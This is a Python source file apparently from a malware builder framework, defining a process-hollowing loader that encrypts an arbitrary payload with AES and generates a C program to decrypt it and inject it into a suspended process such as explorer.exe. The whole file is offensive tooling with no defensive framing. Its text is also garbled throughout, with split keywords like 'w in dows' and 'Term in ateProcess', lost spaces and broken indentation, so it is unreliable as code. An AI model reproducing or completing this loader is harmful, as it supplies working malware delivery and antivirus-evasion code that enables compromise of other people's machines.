import os



import random



from typ in gimport List,Dict,Any,Union,Optional







from core.interfacesimport Bas eLoader



from utils.cryptoimport aes_encrypt,generate_key







clas sProcessHollow in gLoader(Bas eLoader):



    def__init__(self):



        self._platforms=["w in dows"]







defcreate_loader(self,payload:bytes,config:Dict[str,Any])->bytes:















key=generate_key()



encrypted_payload,key,iv=aes_encrypt(payload,key)











target_process=config.get("target_process","explorer.exe")











payload_array=self._bytes_to_c_array(encrypted_payload)



key_array=self._bytes_to_c_array(key)



iv_array=self._bytes_to_c_array(iv)











code=f"""
#include <w in dows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <w in crypt.h>
#pragma comment(lib, "crypt32.lib")

// Зашифрованная полезная нагрузка
unsigned char payload[] = {payload_array};
const size_t payload_size = {len(encrypted_payload)};

// Ключ и вектор инициализации для AES
unsigned char key[] = {key_array};
const size_t key_size = {len(key)};
unsigned char iv[] = {iv_array};
const size_t iv_size = {len(iv)};

// Функция для расшифровки AES
BOOL AESDecrypt(BYTE *payload, DWORD payload_size, BYTE *key, DWORD key_size, BYTE *iv, DWORD iv_size, BYTE *decrypted, DWORD *decrypted_size) {{
    BOOL success = FALSE;
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    DWORD mode = CRYPT_MODE_CBC;

    // Получаем провайдер криптографии
    if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
        return FALSE;
    }}

    // Создаем ключ
    struct {{
        BLOBHEADER hdr;
        DWORD key_size;
        BYTE key_bytes[32]; // AES-256
    }} key_blob;

    ZeroMemory(&key_blob, sizeof(key_blob));
    key_blob.hdr.bType = PLAINTEXTKEYBLOB;
    key_blob.hdr.bVersion = CUR_BLOB_VERSION;
    key_blob.hdr.reserved = 0;
    key_blob.hdr.aiKeyAlg = CALG_AES_256;
    key_blob.key_size = key_size;
    memcpy(key_blob.key_bytes, key, key_size);

    if (!CryptImportKey(hProv, (BYTE*)&key_blob, sizeof(key_blob), 0, 0, &hKey)) {{
        CryptReleas eContext(hProv, 0);
        return FALSE;
    }}

    // Устанавливаем режим и IV
    if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0) ||
        !CryptSetKeyParam(hKey, KP_IV, iv, 0)) {{
        CryptDestroyKey(hKey);
        CryptReleas eContext(hProv, 0);
        return FALSE;
    }}

    // Копируем зашифрованные данные
    memcpy(decrypted, payload, payload_size);
    *decrypted_size = payload_size;

    // Расшифровываем
    if (CryptDecrypt(hKey, 0, TRUE, 0, decrypted, decrypted_size)) {{
        success = TRUE;
    }}

    // Освобождаем ресурсы
    CryptDestroyKey(hKey);
    CryptReleas eContext(hProv, 0);
    return success;
}}

// Получаем ID процесса по имени
DWORD GetProcessIdByName(const char* process_name) {{
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (snapshot != INVALID_HANDLE_VALUE) {{
        PROCESSENTRY32 process_entry;
        process_entry.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(snapshot, &process_entry)) {{
            do {{
                if (_stricmp(process_entry.szExeFile, process_name) == 0) {{
                    pid = process_entry.th32ProcessID;
                    break;
                }}
            }} while (Process32Next(snapshot, &process_entry));
        }}
        CloseHandle(snapshot);
    }}
    
    return pid;
}}

// Основная функция Process Hollow in g
BOOL ProcessHollow in g(const char* target_process, BYTE* payload_data, SIZE_T payload_size) {{
    BOOL result = FALSE;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    CONTEXT context;
    LPVOID remote_image_bas e = NULL;
    SIZE_T bytes_written = 0;
    
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    
    // Создаем целевой процесс в приостановленном состоянии
    if (!CreateProcessA(NULL, (LPSTR)target_process, NULL, NULL, FALSE, 
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {{
        return FALSE;
    }}
    
    // Получаем контекст главного потока процесса
    context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &context);
    
    // Получаем указатель на PEB
    #if def _WIN64
    DWORD64 peb_address = context.Rdx;
    #else
    DWORD peb_address = context.Ebx;
    #endif
    
    // Читаем ImageBas eAddress из PEB
    LPVOID image_bas e_address = 0;
    SIZE_T bytes_read = 0;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(peb_address + 0x10), &image_bas e_address, sizeof(LPVOID), &bytes_read);
    
    // Получаем заголовки PE-файла из процесса
    IMAGE_DOS_HEADER dos_header;
    ReadProcessMemory(pi.hProcess, image_bas e_address, &dos_header, sizeof(IMAGE_DOS_HEADER), &bytes_read);
    
    IMAGE_NT_HEADERS nt_headers;
    ReadProcessMemory(pi.hProcess, (LPCVOID)((DWORD_PTR)image_bas e_address + dos_header.e_lfanew), 
                     &nt_headers, sizeof(IMAGE_NT_HEADERS), &bytes_read);
    
    // Выделяем память для полезной нагрузки
    remote_image_bas e = VirtualAllocEx(pi.hProcess, image_bas e_address, 
                                     payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!remote_image_bas e) {{
        Term in ateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }}
    
    // Записываем полезную нагрузку в память процесса
    if (!WriteProcessMemory(pi.hProcess, remote_image_bas e, payload_data, payload_size, &bytes_written)) {{
        Term in ateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }}
    
    // Обновляем адрес точки входа
    #if def _WIN64
    context.Rcx = (DWORD64)remote_image_bas e + nt_headers.OptionalHeader.AddressOfEntryPo in t;
    #else
    context.Eax = (DWORD)remote_image_bas e + nt_headers.OptionalHeader.AddressOfEntryPo in t;
    #endif
    
    // Устанавливаем новый контекст
    SetThreadContext(pi.hThread, &context);
    
    // Возобновляем поток
    ResumeThread(pi.hThread);
    
    // Закрываем дескрипторы
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
}}

int main() {{
    // Расшифровываем полезную нагрузку
    BYTE* decrypted = (BYTE*)malloc(payload_size);
    DWORD decrypted_size = payload_size;
    
    if (AESDecrypt(payload, payload_size, key, key_size, iv, iv_size, decrypted, &decrypted_size)) {{
        // Выполняем Process Hollow in g
        ProcessHollow in g("{target_process}", decrypted, decrypted_size);
    }}
    
    free(decrypted);
    return 0;
}}
"""







return code.encode('utf-8')







defsupported_platforms(self)->List[str]:



        return self._platforms







def_bytes_to_c_array(self,data:bytes)->str:







return"{"+", ".join([f"0x{b:02x}"forb in data])+"}"